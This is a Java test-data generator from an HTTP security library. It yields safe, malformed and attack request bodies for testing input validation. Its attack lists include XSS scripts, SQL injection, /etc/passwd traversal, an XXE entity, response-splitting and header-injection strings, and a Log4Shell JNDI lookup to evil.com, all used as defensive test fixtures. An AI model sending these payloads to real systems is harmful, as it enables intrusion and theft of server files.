/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.HTTPBody;

/**
 * Generates HTTPBody records for testing purposes.
 * Implements: Task G9 from HTTP verification specification
 */
public class HTTPBodyGenerator implements TypedGenerator<HTTPBody> {

    private static final TypedGenerator<String> SAFE_CONTENT = Generators.fixedValues(
            "{\"user\":\"john\",\"role\":\"admin\"}",
            "username=john&password=secret123",
            "<user><name>John</name><role>admin</role></user>",
            "Hello World",
            "file content here",
            "search query: java programming",
            "comment: This is a test comment",
            "description: Product information",
            "message: Welcome to our application",
            "data: 12345",
            "status: active",
            "type: document",
            "version: 1.0",
            "id: user123",
            "token: abc123def456"
    );

    private static final TypedGenerator<String> ATTACK_CONTENT = Generators.fixedValues(
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
            "\\u0000\\u0001\\u0002\\u0003",  // Null bytes and control chars
            "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",  // HTTP response splitting
            "javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "\\u0000\\u0001\\u0002",  // Unicode null bytes
            "A".repeat(100000),  // Very large payload
            "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",  // Response injection
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",  // XXE
            "\\x3cscript\\x3ealert('xss')\\x3c/script\\x3e",  // Hex encoded XSS
            "\u202e\u202djavascript:alert(1)",  // Unicode direction override
            "eval(atob('YWxlcnQoMSk='))",  // Base64 encoded attack
            "\\n\\r\\u0000\\u00ff"  // Mixed control characters
    );

    private static final TypedGenerator<String> MALFORMED_CONTENT = Generators.fixedValues(
            "",  // Empty content
            "   ",  // Whitespace only
            "\\u0000\\u0000\\u0000",  // Binary data
            "\\u00ff\\u00fe\\u0000\\u0000",  // Unicode BOM
            "{\"malformed\": json,}",  // Malformed JSON
            "<unclosed><tag>",  // Malformed XML
            "username=&password=&submit=",  // Empty form data
            "Content-Type: text/html\r\n\r\n<html>",  // Header injection in body
            "\\u000A\\u000D\\u0000",  // Unicode control chars
            "data:image/png;base64,invalid_base64_data",  // Invalid data URL
            "\uFEFF{\"bom\":\"test\"}",  // BOM in JSON
            "form-data; name=\"file\"; filename=\"../../../etc/passwd\"",  // Path traversal in multipart
            "\\x1B[31mColored Text\\x1B[0m",  // ANSI escape sequences
            "\\\\server\\share\\file.txt",  // UNC paths
            "\u200B\u200C\u200D\u2060"  // Zero-width characters
    );

    private static final TypedGenerator<String> CONTENT_TYPES = Generators.fixedValues(
            "application/json",
            "application/x-www-form-urlencoded",
            "text/plain",
            "text/html",
            "text/xml",
            "application/xml",
            "multipart/form-data",
            "application/octet-stream",
            "image/png",
            "image/jpeg",
            "application/pdf",
            "text/csv",
            "application/javascript",
            "text/css",
            "application/json; charset=utf-8",
            // Attack content types
            "text/html; charset=<script>alert(1)</script>",
            "application/json\r\nX-Injected: header",
            "text/plain\\u0000\\u0001",
            "../../../etc/passwd",
            "application/json; boundary=--evil",
            "text/html; script=<script>alert(1)</script>",
            "application/octet-stream\r\n\r\nHTTP/1.1",
            "",  // Empty content type
            "   ",  // Whitespace content type
            "invalid/content/type/with/slashes",
            "\u202etext/plain",  // Unicode direction override
            "application\\u0000/json"  // Null byte in content type
    );

    private static final TypedGenerator<String> ENCODINGS = Generators.fixedValues(
            "",  // No encoding
            "gzip",
            "deflate",
            "br",  // Brotli
            "compress",
            "identity",
            "chunked",
            "gzip, deflate",
            "br, gzip",
            // Attack encodings
            "../../../etc/passwd",
            "<script>alert(1)</script>",
            "\r\nX-Injected: header",
            "gzip\\u0000deflate",
            "encoding\r\n\r\nHTTP/1.1 200 OK",
            "   ",  // Whitespace encoding
            "gzip; boundary=evil",
            "deflate\\u0001\\u0002",
            "\u202egzip",  // Unicode direction override
            "A".repeat(1000),  // Very long encoding
            "gzip,deflate,br,compress,identity,chunked,evil"  // Too many encodings
    );

    private final TypedGenerator<Integer> typeGen = Generators.integers(0, 3);

    @Override
    public HTTPBody next() {
        int type = typeGen.next();

        return switch (type) {
            case 0 -> new HTTPBody(SAFE_CONTENT.next(), CONTENT_TYPES.next(), ENCODINGS.next());
            case 1 -> new HTTPBody(ATTACK_CONTENT.next(), CONTENT_TYPES.next(), ENCODINGS.next());
            case 2 -> new HTTPBody(MALFORMED_CONTENT.next(), CONTENT_TYPES.next(), ENCODINGS.next());
            default -> new HTTPBody(SAFE_CONTENT.next(), CONTENT_TYPES.next(), ENCODINGS.next());
        };
    }

    @Override
    public Class<HTTPBody> getType() {
        return HTTPBody.class;
    }
}